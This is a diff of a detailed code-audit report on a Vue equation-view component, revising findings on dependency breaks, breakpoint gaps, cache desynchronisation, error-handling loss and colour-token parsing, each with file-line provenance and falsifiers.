-- installed `@mkbabb/value.js@0.13.0` `exports` = `{ ".": { types, import, default } }`
-- producer `value.js@4.0.0` `exports` = `{ "./color", "./value", "./css", "./easing", "./math", "./transform", "./quantize" }` — **no `"."`**
-
-**Claim.** The root export is deleted at 4.0.0. Every one of these three resolves through it. The moment F.W1's atomic tri-package uplift lands, EquationView's plot subtree fails to resolve — three of the five repo-wide breakages are concentrated here, in one component's closure, all for the single symbol `easeInOutSine`. The F.W2 target (`@mkbabb/value.js/easing`) is a mechanical rewrite of three lines.
-
-**Falsifier.** Show a `"."` key in value.js 4.0.0's exports map, or a `main`/`module` fallback (Node ignores those once `exports` is present). Neither is there. Corroborates `CENSUS §…:38` and `lane-frontend.md:480`, re-scoped to this component.
-
-### D-11 · MAJOR · the installed value.js **already violates** glass-ui 4.0.0's peer range — *contradicting* the corpus's "latent, not live" framing
-
-**Provenance**
-- `web/package.json` deps: `"@mkbabb/value.js": "^0.13.0"`; installed `node_modules/@mkbabb/value.js/package.json` → `0.13.0`
-- installed `node_modules/@mkbabb/glass-ui/package.json` `peerDependencies` → `"@mkbabb/value.js": "^0.10.0 || ^0.11.0"`
-- `web/package.json` has **no** `overrides`, `resolutions`, or `pnpm.peerDependencyRules` (all three read `None`)
-
-**Claim.** For pre-1.0 versions npm's caret pins the minor: `^0.10.0` ≡ `>=0.10.0 <0.11.0`, `^0.11.0` ≡ `>=0.11.0 <0.12.0`. **0.13.0 satisfies neither.** The peer constraint is unmet *today*, at the current pins, with no override suppressing it.
-
-**Contradiction, stated explicitly.** `CENSUS-2026-08-03.md` line 38 characterises the value.js situation as *"latent, not live, while 0.13.0 remains installed"*, and `lane-frontend.md:480` frames the peer problem as forward-looking ("7.0 peers `@mkbabb/value.js@^4.0.0`; installed 0.13.0"). Both are correct about the *4.0.0 root-export* break being latent (D-10). Neither notices that the **4.0.0 → 0.13.0** peer edge is already red. The tree disagrees with the corpus here and the tree wins: the constraint is in the installed package's own metadata.
-
-**Falsifier.** Show an override/resolution, or a peer range admitting 0.13.0. Neither exists. `UNPROVEN-NEEDS-LIVE` only for whether the installer *warned* (that depends on the package manager and is not recoverable from the tree); the constraint violation itself is proven from the two `package.json`s.
-
-### D-12 · MAJOR · two of the four glass-ui imports are on the producer's deletion list
-
-**Provenance**
-- `EquationView.vue:9` `HoverCard` → removed at 5.0.0 (`lane-frontend.md:473`; `CHANGELOG.md:216` per that row)
-- `EquationView.vue:10` `MetricBadge` → removed at 7.0.0, successor `Metric` from `./metric` (`lane-frontend.md:472`)
-- surviving: `:8` `Button` (`./button`), `:13` `SegmentedTabs` (`./tabs`, confirmed exported at 4.0.0 via `dist/components/custom/tabs/index.d.ts:1`)
-
-**Claim.** 50 % of this seat's glass-ui import surface is scheduled for deletion inside the single atomic uplift the census books as F.W1. EquationView is therefore a *gating* component for that transaction, not a follower.
-
-**Falsifier.** Show either symbol surviving at 7.0.0. Both are corpus rows with `CHANGELOG` provenance; the installed 4.0.0 still exports `./hover-card` and `./metric-badge`, which is exactly why this is MAJOR-now rather than BLOCKER-now.
-
-### D-13 · MAJOR · triple breakpoint authority at 1024 px, with a reachable dead band in [1023, 1024)
-
-**Provenance**
-- `EquationView.vue:45` `const isDesktop = useMediaQuery("(min-width: 1024px)")` — JS authority
-- `EquationView.vue:187` `class="… lg:hidden"` — Tailwind authority (`lg` is config-owned)
-- `EquationView.vue:196`/`:219` `:class="{ 'panel-inactive': mobileView !== '…' && !isDesktop }"`
-- `EquationView.vue:437-441` `@media (max-width: 1023px) { .panel-inactive { display: none } }` — CSS authority
-- plus `:338`, `:349`, `:350`, `:361`, `:362`, `:371`, `:376` — seven more hand-written breakpoints
-
-**Claim.** One layout decision is expressed three times in two languages with two different numeric conventions (`min-width: 1024` vs `max-width: 1023`). The `.panel-inactive` *class* is applied by the JS authority but only *has an effect* under the CSS authority, and the two do not tile: at a viewport width `w` with `1023 < w < 1024` (reachable via browser zoom, fractional device pixel ratios, and OS display scaling, all of which produce fractional CSS px), `matchMedia("(min-width:1024px)")` is **false** (so the class is applied) while `@media (max-width:1023px)` is also **false** (so `display:none` never lands). Both panels render, in the mobile flex column, simultaneously.
-
-**Failure scenario.** 1023.5 px viewport, `mobileView = "controls"` → the right panel carries `.panel-inactive` with no rule behind it → the convergence plot and its rAF loop mount below the controls in a layout never designed for it. `UNPROVEN-NEEDS-LIVE` for the visual outcome; the media-query gap is provable statically.
-
-**Falsifier.** Show the CSS using `max-width: 1023.98px` (the standard mitigation) or `not all and (min-width: 1024px)`, or the JS and CSS sharing one token. It uses the bare integer `1023`, and `useMediaQuery` hardcodes `1024` in a string literal. Falsified also if `SegmentedTabs`'s own `responsive` prop were used — it is not (see D-24), and it would have collapsed all three authorities into one.
-
-### D-14 · MAJOR · `reconstructed_points` is dead payload — computed, serialised, cached, never read; and the reconstruction is duplicated client-side
-
-**Provenance**
-- `lib/equation/types.ts:31` `reconstructed_points: { x: number[]; y: number[] }`
-- `api/routers/equations.py:100-105` the server builds it: a full complex reconstruction loop over every term
-- `api/routers/equations.py:126` it is returned on every `/compute`
-- `grep -rn "reconstructed_points\|reconstructedPoints" web/src/ web/e2e/` → **1 hit, the type declaration.** Zero consumers.
-- `EquationView.vue:120`/`:141` `saveCachedResult(result.value, …)` → `useEquationCache.ts:48` `JSON.stringify({ result: r, … })` — the dead array is written to `sessionStorage` too
-- `ConvergencePlot.vue:159-163` recomputes the full sum client-side from `coefficients`
-
-**Claim.** Every `/compute` response carries `n_eval_points` (500) float64s the client never reads, then persists them to `sessionStorage`. At full JSON float precision that is ≈10 KB of wire + storage per request, for nothing. Simultaneously, the reconstruction math exists on **both** sides of the seam (`equations.py:100-105` and `ConvergencePlot.vue:159-163`) with no test tying them together — so they can silently diverge, and the side that is authoritative is the one that is never transmitted's twin.
-
-**Falsifier.** Find any read of the field. The grep is exhaustive over `web/src` and `web/e2e`. Falsified if the field is contractually required by another client — `grep -rn "reconstructed" api/` would need to show a second consumer; the repo has one web client.
-
-### D-15 · MAJOR · `simplifyCoefficients` takes a foreign domain type, forcing a DTO→BasisComponent→DTO round-trip and a self-inflicted cast
-
-**Provenance**
-- `EquationView.vue:59-67` maps `FourierTermDTO` → `BasisComponent` (`{ index, coefficient: [re,im], amplitude, phase }`)
-- `lib/types.ts:1-6` `BasisComponent` — the *epicycle/basis-decomposition* domain type, not the equation domain
-- `lib/equation/api.ts:38-44` maps `BasisComponent` **straight back** to `FourierTermDTO`
-- `EquationView.vue:72` `const coefficients = computed(() => result.value?.coefficients ?? [])` — the raw DTOs are already sitting right there, and are already passed to `useCoeffHover` (`:76`)
-- `lib/equation/api.ts:36` `notation: string` — the parameter is typed **wider** than the caller's value
-- `lib/equation/api.ts:49` `notation: notation as SimplifyRequest["notation"]` — a cast that exists **only** because of line 36
-
-**Claim.** The client wrapper for one of the 45 operations declines the operation's own DTO in favour of a type from a different feature domain, then converts back. The conversion is lossless and therefore pure waste. And the `notation` parameter is declared `string` even though every caller (`EquationView.vue:137`) passes a well-typed `NotationMode` — which manufactures the `as` cast at `:49`. The file's own header (`:4`) celebrates retiring "the 2 `as unknown as` casts"; it left behind a third cast that its own signature creates.
-
-**Falsifier.** Show a caller that has `BasisComponent`s but not `FourierTermDTO`s. `grep -rn "simplifyCoefficients" web/src/` → one call site, `EquationView.vue:137`, which holds both. Falsified for the cast half if `NotationMode` were not importable in `lib/equation/api.ts` — it is; the file already imports from `./types` at `:14-20`.
-
-### D-16 · MAJOR · `useCoeffHover`'s documented amber fallback is unreachable, and the real failure mode is a grey popover
-
-**Provenance**
-- `useCoeffHover.ts:60-65`
-  ```
-  // D.W4.d — KaTeX cannot resolve CSS vars; read the resolved
-  // `--viz-amber` hex via VIZ_COLORS at render time … The
-  // STATIC.golden constant is the canonical fallback used when
-  // `resolveVizColors` has not yet run (mounted before paint).
-  const amber = VIZ_COLORS.amber || VIZ_COLORS.golden;
-  ```
-- `lib/colors.ts:77-87` `VIZ_COLORS` is seeded `amber: "#b37a2d"` — a **non-empty string** before `resolveVizColors` ever runs
-- `lib/colors.ts:24,53` `cssVarToHex` returns `"#888888"` on both the empty-value and the no-match branches — also non-empty
-- `lib/colors.ts:32-53` the parser has arms for `#hex`, `hsl(…)`, bare `h s% l%`, `rgb(…)` — and **no `oklch()` / `lab()` / `color()` arm**
-- `web/src/style.css:120,125` fourier overrides `--viz-amber: hsl(35 76% 35%)` / `hsl(37 73% 67%)`
-
-**Claim.** `VIZ_COLORS.amber` is *never* falsy, so `|| VIZ_COLORS.golden` is unreachable dead code and the comment's stated invariant is false. The genuine failure mode is not "falls back to golden" — it is "**silently renders `#888888` grey**", because `cssVarToHex`'s failure return is a truthy grey. Today the token happens to parse (the bare-`hsl` arm matches the space-separated syntax); the moment `--viz-amber` is authored in `oklch()` — which is what the glass-ui 7 uplift in F.W1 brings — the coefficient popover renders grey while `EquationView.vue:421` (`.eq-card :deep(.eq-coeff:hover) { color: var(--viz-amber) }`) renders correct amber from the *same token* via the *other* path. Two resolution paths for one token, silently disagreeing.
-
-**Failure scenario.** Post-F.W1: hover an `a_n` in the sigma equation. The symbol turns amber (CSS path). The KaTeX popover it opens shows `a_1 = 0.4053` in grey (JS path). No error, no warning.
-
-**Falsifier.** Show `VIZ_COLORS.amber` reachable as `""`/`undefined`. `reactive({ amber: "#b37a2d", … })` (`colors.ts:81`) plus `cssVarToHex`'s two truthy returns make that impossible without an external mutation, and `resolveVizColors` (`:94`) only ever assigns `cssVarToHex`'s output. Falsified for the oklch half if glass-ui 7's `--viz-amber` stays in `hsl()` — that is checkable against the producer and is the one open question; the dead-fallback and grey-failure halves stand regardless.
-
-**Corpus contradiction (stated).** `CENSUS §…:187-188` books F.W2's colors.ts work as deleting "the hand-rolled arms (declared 3-line hex residual)". Reached from EquationView, this is not a 3-line hex residual — it is a live two-path token-resolution contract with a false invariant comment and a silent-wrong-color failure. The F.W2 scope needs widening.
-
-### D-17 · MAJOR · `saveCachedResult` re-serialises the whole response on every debounced simplify
-
-**Provenance**
-- `EquationView.vue:141` `if (result.value) saveCachedResult(result.value, displayLatex.value, displayEnergy.value)` — inside `doSimplify`
-- `useEquationCache.ts:48` `sessionStorage.setItem(RESULT_KEY, JSON.stringify({ result: r, latex, energy }))`
-- payload: `original_points` (2 × `n_eval_points` = 1000 float64s) + `reconstructed_points` (another 1000, all dead — D-14) + up to ~201 coefficient objects × 5 floats
-
-**Claim.** Every notation/budget change re-`JSON.stringify`s ≈40 KB and performs a **synchronous, main-thread, blocking** `sessionStorage` write — even though `result` has not changed. Only `latex` and `energy` changed; the cache API offers no partial update. The `try {} catch {}` at `:48` swallows `QuotaExceededError` silently, so a full store degrades to "the cache silently stops working" with no signal (compounding D-04's poisoning surface).
-
-**Falsifier.** Show `result` changing inside `doSimplify` — it does not; `doSimplify` writes only `displayLatex`, `displayEnergy`, `lastDisplayKey`. Cost magnitude is `UNPROVEN-NEEDS-LIVE`; the redundant write is provable.
-
----
-
-## §3 — MINOR
-
-| # | sev | claim | provenance | falsifier |
-|---|---|---|---|---|
-| D-18 | MINOR | The lucide `info` glyph is hand-inlined as 3 raw SVG paths **while the same icon is imported and used 20 lines later**. `<circle cx=12 cy=12 r=10/><path d="M12 16v-4"/><path d="M12 8h.01"/>` is byte-for-byte lucide's `info`. | `EquationView.vue:277-279` (inline) vs `:11` `import { Info } from "lucide-vue-next"` vs `:300` `<Info class="size-3.5 …" />` | Show the inline SVG differing from lucide's `info` path data. It does not. |
-| D-19 | MINOR | Two unlinked magic `500`s span the client↔operation seam: the client's `n_eval_points` and the plot's own sample count. Change one and the cursor/blend geometry desyncs from the transmitted grid with no compile-time signal. | `EquationView.vue:108` `n_eval_points: 500` · `ConvergencePlot.vue:108` `const nPts = 500` · `api/models/equations.py:21` `ge=50, le=5000` | Show a shared constant. There is none; the two literals are in different files with no import between them. R6-8's seam-attribution lesson. |
-| D-20 | MINOR | Six `v-model:` bindings and one hand-rolled `:prop` + `@update:` pair on the **same element**, for a prop the child already declares as a matching prop/emit pair (i.e. it could be `defineModel`). | `EquationView.vue:199-209` (`v-model:expression`…`v-model:notation`, then `:auto-harmonics` + `@update:auto-harmonics`) vs `FunctionInput.vue:15,21` | Show `autoHarmonics` needing one-way flow. `FunctionInput.vue:33` `emit("update:autoHarmonics", !props.autoHarmonics)` is a plain toggle — `defineModel<boolean>("autoHarmonics")` is equivalent. |
-| D-21 | MINOR | `effectiveN` / `energyCaptured` / `autoHarmonics` / `vizHarmonics` are all declared **optional** on the child, forcing defensive `?? nHarmonics` fallbacks in three places — yet EquationView always passes all four. Unearned optionality paid for at every use site. | `FunctionInput.vue:12-18` (all `?`) vs `EquationView.vue:205-208` (all passed) vs `FunctionInput.vue:183`, `:216`, `:217` (`vizHarmonics ?? nHarmonics` ×3) | Show a second `<FunctionInput>` mount omitting them. `grep -rn "<FunctionInput" web/src/` → one. |
-| D-22 | MINOR | `:disabled="!effectiveN"` can essentially never fire — `effectiveN` is seeded `20` and only ever reassigned from a server response. | `EquationView.vue:41` `ref(cachedRes?.result?.effective_n ?? 20)` · `:119` · `FunctionInput.vue:193` | Show a path setting `effectiveN` to `0`. Only `compute_effective_n` could, and the disabled state would then be indistinguishable from "not yet computed". |
-| D-23 | MINOR | `SegmentedTabs` emits `(value: string)`, forcing a `as 'controls' \| 'canvas'` cast at the seat. The library's model is a bare `string`, so the consumer's union is unenforceable at the boundary. | `EquationView.vue:191` · `dist/components/custom/tabs/SegmentedTabs.vue.d.ts` `__VLS_ModelProps = { modelValue: string }`, emit `"update:modelValue": (value: string) => any` | Show a generic parameter on `SegmentedTabs`. There is none at 4.0.0 — this is a **producer-side** contract weakness the consumer absorbs; carry to glass-ui. |
-| D-24 | MINOR | `SegmentedTabs` ships a `responsive` prop that collapses the strip to a `<Select>` below a configurable breakpoint. EquationView hand-rolls the entire mobile/desktop split instead (D-13's three authorities). | `dist/…/SegmentedTabs.vue.d.ts` `SegmentedTabsResponsive { breakpoint, desktopOptions, ariaLabel, triggerClass }` vs `EquationView.vue:45,187,196,219,437-441` | Show `responsive` unable to express the panel swap. It cannot express the *panel* swap — but it would have owned the *breakpoint*, which is the part that is triplicated. |
-| D-25 | MINOR | Within one file, two floating surfaces use two different shadow idioms: `.coeff-popover` tokenises (`color-mix(in srgb, var(--foreground) 8%, transparent)`) while `.info-hovercard` hardcodes `rgba(0,0,0,0.12)` — which does not adapt to dark mode. | `EquationView.vue:400` vs `:465` | Show `rgba(0,0,0,0.12)` intended as theme-invariant. The sibling 20 lines up proves the tokenised idiom is the house style. |
-| D-26 | MINOR | Stale provenance citation: the code cites `api/routers/equations.py:61` for the `endpoint=False` convention; the statement is at line **59**. | `ConvergencePlot.vue:113` vs `api/routers/equations.py:59` | Read the file. Off by two. |
-| D-27 | MINOR | `lucide-vue-next` is imported by **runtime source** but declared in `devDependencies`; separately, glass-ui 4.0.0 peers `@lucide/vue@^1.16.0`, which is **not installed** (only `@lucide/vue` as a transitive dir; `lucide-vue-next` is the one resolved). | `EquationView.vue:11` · `web/package.json` `devDependencies["lucide-vue-next"]` · glass-ui `peerDependencies["@lucide/vue"]` | Show the app shipping without bundling. It is a Vite bundle, so it "works" — the defect is classification + an unmet producer peer, both provable from the manifests. Extends `lane-frontend.md:70`'s dead-devDep row from the opposite direction. |
-| D-28 | MINOR | `/equation` has **zero functional coverage**. The only spec touching it is a screenshot/axe visual baseline at 375 / 1280 / 1440 — no viewport in D-13's 1023–1024 band, and no interaction with any control audited above. | `web/e2e/visual-baseline.spec.ts:34`, `:40-44`; `grep -rln "equation" web/e2e/` → that file only | Show an interaction spec. `ls web/e2e/` → contour, gallery, paper-perf, settings, visual-baseline, viz-crud, viz-ux, workspace. None is equation. |
-
----
-
-## §4 — SUPERLATIVES (L-18, both ways)
-
-### S-01 · the E.W5 fetch-core collapse retired two casts **structurally**, and the reasoning is committed next to the code
-
-`lib/equation/api.ts:1-12` records that the local `eqFetch` (a 4th fetch helper with its own AbortController registry) was deleted in favour of the shared `apiFetch`, and — the part that matters — that the two `as unknown as` casts retired *because the core's `body` axis was widened to `FormData | Record<string, unknown> | BodyInit | undefined`*, not because someone deleted the word `as`. `lib/api.ts:73-84` carries the same reasoning from the other side. **Verified:** `grep -rn "as unknown as" web/src/lib/equation/ web/src/components/equation/` → 1 hit, and it is the prose in that header. Zero real casts.
-
-*Falsifier:* a surviving `as unknown as`, or a `body` type that still requires one. `lib/api.ts:89-92` types `body?: FormData | BodyInit | object` — the widening is real. **Not falsified.** *Caveat (D-15):* the same file left a third, self-inflicted cast at `:49` by declaring `notation: string`. The superlative stands for the two it retired properly; the third is booked as a defect.
-
-### S-02 · `useCoeffHover` — a correct, minimal extraction with the right DOM strategy
-
-`composables/useCoeffHover.ts` lifts 106 lines of KaTeX rendering + DOM hit-testing out of the SFC behind a clean two-in/five-out contract, consumed in exactly two lines (`EquationView.vue:75-76`). The DOM strategy is the right one: **one** delegated `mousemove` on the card (`:252`) with `closest(".eq-coeff")` (`useCoeffHover.ts:29`), rather than N listeners on N KaTeX spans that KaTeX re-creates on every re-render. Coordinates are computed relative to the card via two `getBoundingClientRect`s (`:36-41`), so the popover positions correctly inside a scrolled/transformed ancestor.
-
-*Falsifier:* per-span listeners, or a positioning scheme that breaks under scroll. Neither present. **Not falsified.** *Caveat (D-16):* its colour resolution carries a false invariant comment.
-
-### S-03 · the ordering hazard at `:116-118` is documented at the exact line where it bites
+**The sharpening: it escalates from the shipped defaults with one gesture.** `EquationView.vue:28-29` ships `nHarmonics = 20`, `budget = 10`. Replaying `:151-159` step-by-step as the Harmonics slider is dragged (`autoHarmonics` → false on drag, so `vizHarmonics === nHarmonics`, `:53-55`):
 
 ```
-// Capture display key BEFORE effectiveN triggers the vizHarmonics→budget
-// chain, so a subsequent doSimplify can detect the budget changed.
-lastDisplayKey = displayKey();
-effectiveN.value = result.value.effective_n;
+nH= 30 -> budget=20        nH= 55 -> budget=45
+nH= 40 -> budget=30        nH= 60 -> budget=50   (boundary)
+nH= 50 -> budget=40        nH= 61 -> budget=51   *** le=50 VIOLATED ***
+                           nH=100 -> budget=90   (slider max, FunctionInput.vue:184)
 ```
-A two-line comment naming a *reactive-graph ordering* dependency — that assigning `effectiveN` synchronously fires `vizHarmonics` → the `:151` watcher → `budget`, which would otherwise invalidate a key captured after. This is the rare case of load-bearing sequencing being annotated where it is load-bearing rather than in a distant doc.
 
-*Falsifier:* show the ordering doesn't matter. Swap the two lines and `displayKey()` reads the mutated `budget`, so `doSimplify`'s `key === lastDisplayKey` check at `:133` would suppress a needed re-render. The comment is correct. **Not falsified.** *Caveat (D-06):* the author saw the hazard on the `budget` axis and stopped short of the `notation`-mid-flight axis, which the same capture also breaks.
+Round-half-up makes each +1 harmonic add exactly +1 budget once `ratio ≥ 0.5`, so the crossing is deterministic at **nHarmonics = 61** — reachable by dragging one visible slider, from a cold load, without touching `budget` at all. Both `:110` (compute) and `:137` (simplify) then carry the out-of-range value.
 
-### S-04 · the client names the server's sampling convention and cites its source line
+**Third entry v1 did not name:** `budget` is restored from `sessionStorage` (`:29`, `useEquationCache.ts:25-30`), so an already-escalated budget makes the **first** compute of the *next* session 422 before the user touches anything.
 
-`ConvergencePlot.vue:112-115` and `:123-127` explain, in the client, that the partial-sum x-grid uses `endpoint=false` *because that is the backend's equispaced Fourier convention* (the periodic wrap identifies `x = domB` with `x = domA`), while the original curve gets an appended closing sample for visual closure. **Verified live:** `api/routers/equations.py:59` `np.linspace(domain[0], domain[1], req.n_eval_points, endpoint=False)`. A client that documents *why* its geometry differs from the payload's, with a pointer into the server, is exactly the client↔operation join R6-8 says must exist somewhere.
+> **Falsifier.** Any client clamp ≤ 50, or a server bound ≥ 100. `grep -n "budget" web/src/components/equation/*.vue web/src/lib/equation/*.ts` → no bound anywhere; `SliderControl.vue:41-56` clamps to `props.max` (= `vizHarmonics`, up to 100); `api/models/equations.py:23,40` both read `le=50`; `:152` clamps down only. **Not falsified.**
 
-*Falsifier:* the backend using `endpoint=True`, or the two grids being identical (making the comment noise). Neither. **Not falsified.** *Caveat (D-26):* the citation is two lines stale — the pointer is right, the line number drifted.
+### 2.2 · D-02 — the failure renders as nothing; and the server's only diagnostic is *destructured away*
+
+**FOLDED + SHARPENED.** v1 correctly derived the collapse: `/api/equations/*` emits plain `application/json`, so `ApiProblem.from` falls to `title = response.statusText`, which is `""` over HTTP/2 ⇒ `error.value = ""` ⇒ both banners' truthiness gates fail (`:229`, `:243`) ⇒ **silence**. It also correctly noted that EquationView reads only `.message`, never `.detail`/`.status`/`.type`.
+
+**The sharpening — the mechanism, at `lib/api-problem.ts:38-47`:**
+
+```
+const { type, title, status, detail, instance, ...extensions } = body;
+return new ApiProblem(…, typeof detail === "string" ? detail : undefined, …, extensions);
+```
+
+FastAPI's `RequestValidationError` emits `{"detail": [{loc, msg, type}, …]}` — an **array**. `detail` is named in the destructure, so it is *removed from the rest spread*, and then dropped by the `typeof === "string"` test. The field-level diagnosis is therefore unreachable **even to a consumer that reads `.extensions`**. The API told the client that `budget` exceeded 50 (D-01); the client parsed that sentence and deleted it.
+
+Compounding, per v1: the file's own header (`:8-13`) advertises extension members "e.g. fourier emits `errors` for field-level zod failures" — a shape the fourier API does not emit. `grep -n "exception_handler" api/main.py` → **one** handler, `Exception`, at `:114`. The client's error model was written against a contract the server never implemented.
+
+> **Falsifier.** `detail` surviving in `extensions` (it cannot — it is named in the destructure), or a `RequestValidationError` handler producing problem+json (there is none). The HTTP/2-empty-`statusText` half stays `UNPROVEN-NEEDS-LIVE`; the HTTP/1.1 half is provable and *also* defective ("Unprocessable Entity", unactionable). **Not falsified.**
+
+### 2.3 · D-04 — unvalidated `sessionStorage` → `ComputeEquationResponse`; unguarded field access blanks the route with no recovery
+
+**FOLDED intact.** `useEquationCache.ts:36-41` returns `JSON.parse(raw)` as `CachedResult` with zero shape validation; `:59-67` guards the *object* (`if (!result.value) return []`) then dereferences the *field* (`result.value.coefficients.map`), while the correct guard sits three lines below at `:72` (`result.value?.coefficients ?? []`). A truthy-but-shapeless entry throws in the render pass; `:174`'s `if (!result.value) doCompute()` is gated on the same object check, so **no recompute ever runs** and there is no clear-cache affordance. This is the failure family value.js's own W44 "born-RED blank" records.
+
+### 2.4 · D-05 — the Notation control is inert in the default display mode *(v1 MAJOR → v2 BLOCKER)*
+
+**FOLDED + PROMOTED.** `:43` `eqMode = ref("sigma")` — sigma is the **default**. `:49-51` makes `activeLatex` prefer `displayLatexSigma`, which is written at exactly two lines: `:39` (cache init) and `:114` (inside `doCompute`). `doSimplify` writes only `displayLatex` (`:138`) — the expanded form the sigma view never reads. And `SimplifyResponse` carries no sigma field on either side of the seam (`lib/equation/types.ts:42-46`; `api/models/equations.py:44-47`), though the server *does* render sigma per-notation (`api/routers/equations.py:96` `render_latex_sigma(terms, req.notation)`).
+
+So: click a Notation pill → `watchDebounced` (`:177-181`, comment "Cheap re-render on notation/budget change") fires → `POST /simplify` succeeds → `lastDisplayKey` advances → **the rendered equation does not change**. Worse, the state machine now believes the display is current for the new notation, so subsequent `doSimplify` calls early-return at `:133`. Selected notation and displayed notation diverge **permanently** until the user presses Compute.
+
+**Promotion rationale.** v1 graded this MAJOR. It governs the *default* view of the panel's primary control, produces no error, and is self-sealing (the memo suppresses the retry). That is the same bar as D-01: a shipped broken state with no recovery signal.
+
+> **Falsifier.** `latex_sigma` on `SimplifyResponse`, a `displayLatexSigma` write outside `doCompute`, or `eqMode` defaulting to `expanded`. None hold. **Not falsified.**
+
+### 2.5 · C-29 — **NEW** · the two-record cache desynchronises input state from result state, and `:174` guarantees the stale pair is presented as correct
+
+**BLOCKER — net new; v1 reached the adjacent malformed-cache case (D-04) but not this one, which is reachable by entirely normal use.**
+
+`useEquationCache.ts:7-8` keeps **two independent** records:
+
+```
+const STATE_KEY  = "eq-tab-state-v2";    // written on EVERY input change
+const RESULT_KEY = "eq-tab-result-v2";   // written ONLY after a successful compute/simplify
+```
+
+`EquationView.vue:161-171` watches the six input refs with **no debounce**, and `expression` is `v-model`'d onto a text `<input>` (`FunctionInput.vue:98-111`) — so the input record is rewritten on every keystroke. The result record is written only at `:120` and `:141`.
+
+Type a new expression, do **not** press Compute, reload:
+
+1. `:25-30` restores the **new** expression / domain / harmonics.
+2. `:37-41` restores the **old** `result`, `latex`, `energy`, `effective_n`.
+3. `:79` computes `lastComputeKey` from the **new** inputs.
+4. `:174` — `if (!result.value) doCompute();` — `result.value` is truthy ⇒ **no recompute ever fires**.
+5. `:255` renders the OLD series as the answer.
+6. `:309-316` hands `ConvergencePlot` the **old** `original_points` + `coefficients` together with the **new** `:expression` and **new** `:domain`.
+
+Step 6 is the quantitatively wrong part. `ConvergencePlot.vue:104` derives `omega = 2π/(domB − domA)` from the **new** domain and applies it to the **old** coefficients; `:176` sets `minX = ox[0]` (old grid) against `maxX = domB` (new domain). Harmonic curves are drawn at the wrong frequency across a mismatched extent, and `:263-264` labels the whole plot `f(x) = <the new expression>`. **A wrong Fourier series is rendered, tooltipped, and attributed to a function that was never computed** — no banner, no spinner, no error.
+
+Recovery requires the user to notice and press Compute (`:210`, `force = true`), because the non-forced path early-returns at `:95`.
+
+Compounds D-06: the race there writes `saveCachedResult(result.value /* NEW */, displayLatex.value /* STALE */, …)` at `:141`, manufacturing exactly this desynchronised pair *without* any user reload.
+
+> **Falsifier.** Falsified if (a) the result record carried its own compute key that `:79`/`:174` compared, (b) the two records were one atomic write, or (c) `:174` compared keys rather than nullity. `useEquationCache.ts:19-23` — `CachedResult = { result, latex, energy }`, **no key**; `:32-34` and `:43-49` are two separate `setItem` calls under two separate keys; `:174` tests nullity only. **Not falsified.**
 
 ---
 
-## §5 — Consumption verdict per producer
+## §3 — MAJOR (16)
+
+**Folded intact from v1** (detail in the v1 body, preserved above by id): **D-06** racing abort keys · **D-07** dead `loading` computed · **D-08** `HoverCard` + global CSS reimplements the installed `HoverPopover` · **D-09** `.cartoon-card` × 5 on a resurrection shim · **D-10** 3 of 5 value.js bare specifiers in this closure · **D-12** 2 of 4 glass-ui imports on the deletion list · **D-13** triple breakpoint authority + the [1023, 1024) dead band · **D-14** `reconstructed_points` dead payload · **D-15** `BasisComponent` round-trip + self-inflicted cast · **D-17** whole-response re-serialise per simplify.
+
+### D-11 — the peer edge is red today, but v1 states it too strongly and misses *why* 0.13.0 is pinned
+
+**FOLDED + CORRECTED-IN-PART.** v1's core claim verifies: installed `@mkbabb/glass-ui@4.0.0` declares `peerDependencies["@mkbabb/value.js"] = "^0.10.0 || ^0.11.0"`; installed value.js is **0.13.0**; `web/package.json` has no `overrides`/`resolutions`. Under pre-1.0 caret semantics 0.13.0 satisfies neither range. **The edge is unmet today** — and v1 is right that both `CENSUS-2026-08-03.md`'s "latent, not live" framing and `lane-frontend.md:480`'s forward-looking framing miss it.
+
+**Correction:** glass-ui also declares `peerDependenciesMeta["@mkbabb/value.js"] = { "optional": true }`. An optional peer that is *present but out of range* still produces `EBADPEER`, but as a **warning**, not an install failure. v1's severity is right; its implied blast radius is not.
+
+**Addition (net new, and the more consequential half):** `@mkbabb/keyframes.js@4.3.0` declares a **hard `dependencies` entry** `"@mkbabb/value.js": "^0.13.0"` — plus `optionalDependencies: { "@mkbabb/glass-ui": "~4.0.0" }`. So value.js 0.13.0 is **pinned from below by keyframes**, not merely chosen by fourier, and the tilde on glass-ui is the lock `lane-frontend.md:490` names. The corpus records the *forward* leg (keyframes@6 → value.js 4.0.0 exact) but not this *backward* one, which is what makes F.W2 un-landable alone and re-confirms census risk 1 from a second direction.
+
+> **Falsifier.** An override/resolution, or a peer range admitting 0.13.0 — neither exists. Whether the installer *warned* is `UNPROVEN-NEEDS-LIVE`; the constraint state is proven from three `package.json`s.
+
+### D-16 — the colour arm: v1's mechanism is right, its **timing is wrong** — the failure is live at the installed version
+
+**FOLDED + CORRECTED.** v1's two mechanism claims hold and are excellent: (a) `VIZ_COLORS.amber` is never falsy (`colors.ts:81` seeds `"#b37a2d"`; both `cssVarToHex` returns are truthy), so `useCoeffHover.ts:65`'s `|| VIZ_COLORS.golden` is **unreachable dead code** and its comment states a false invariant; (b) the real failure mode is a truthy **grey `#888888`**, not a golden fallback.
+
+**Correction — v1 says "the moment `--viz-amber` is authored in `oklch()`, which is what the glass-ui 7 uplift in F.W1 brings". That moment has already arrived, at the installed 4.0.0.** From `node_modules/@mkbabb/glass-ui/dist`:
+
+```
+--viz-fourier:   light-dark(oklch(0.579 0.201 30.4), oklch(0.693 0.151 28.1));
+--viz-chebyshev: light-dark(oklch(0.484 0.163 265.5), oklch(0.718 0.107 268.4));
+--viz-legendre:  light-dark(oklch(0.532 0.180 317.5), oklch(0.739 0.134 318.1));
+--viz-amber:     var(--section-color-5);
+--viz-green:     var(--section-color-4);
+--section-color-4: light-dark(oklch(0.551 0.088 171.1), oklch(0.776 0.105 172.6));
+--section-color-5: light-dark(oklch(0.623 0.124 69.6),  oklch(0.813 0.109 78.2));
+```
+
+`cssVarToHex` (`colors.ts:22-54`) has four arms — `#hex`, `hsl(…)`, bare `h s% l%`, `rgb(…)` — and falls through to `return "#888888"` at **`:53`** (v1 cites `:52`; off by one in the working tree). Neither `light-dark(…)` nor bare `oklch(…)` matches any arm. **So `VIZ_COLORS.fourier`, `.chebyshev`, `.legendre` and `.green` are grey right now.**
+
+**Two additions v1 does not reach:**
+
+1. **`--section-color-5` — the token behind `--viz-amber` — is itself oklch.** The *only* reason `VIZ_COLORS.amber` is not grey is the consumer's own override at `web/src/style.css:120`/`:125`, landed for a **WCAG contrast** reason (`D.W4.d`, comment `:113-119`), not for the parser.
